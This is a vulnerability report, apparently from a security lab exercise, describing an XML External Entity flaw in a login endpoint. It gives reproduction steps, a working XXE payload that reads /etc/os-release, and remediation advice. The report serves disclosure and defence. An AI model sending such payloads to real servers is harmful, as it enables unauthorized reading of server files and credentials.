# XML External Entity (XXE) Leading to Local File Disclosure

## Vulnerability Type

XML External Entity (XXE)

## Summary

The application processes user-supplied XML input without properly disabling external entity resolution.

An attacker can define an external entity within the XML document and force the server to read local files from the underlying operating system. This results in unauthorized disclosure of sensitive files and server information.

## Vulnerable Endpoint

```http
https://kzlabs.in/1407.php
```

## Steps to Reproduce

1. Navigate to the vulnerable login functionality.
2. Intercept the XML request using Burp Suite.
3. Modify the XML body to include an external entity referencing a local file.
4. Send the modified request.
5. Observe that the contents of the referenced file are returned in the server response.

## Payload Used

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/os-release">
]>
<login>
    <email>&xxe;</email>
    <password>sarah@123</password>
</login>
```

## Proof of Concept


The server response includes the contents of the `/etc/os-release` file within the application's error message, disclosing:

* Operating System Name
* Ubuntu Version
* Distribution Information
* System Configuration Details

This confirms that XML external entities are processed by the application and can be used to access local files on the server.

## Impact

* Unauthorized access to sensitive files
* Disclosure of server configuration information
* Exposure of application secrets and credentials
* Information disclosure that may facilitate further attacks
* Potential compromise of the underlying system

## Recommendations for Fix

* Disable external entity processing in XML parsers.
* Disable DTD processing if not required.
* Use secure parser configurations.
* Validate and sanitize XML input.
* Implement allowlists for accepted XML structures.
* Keep XML parsing libraries updated with security patches.
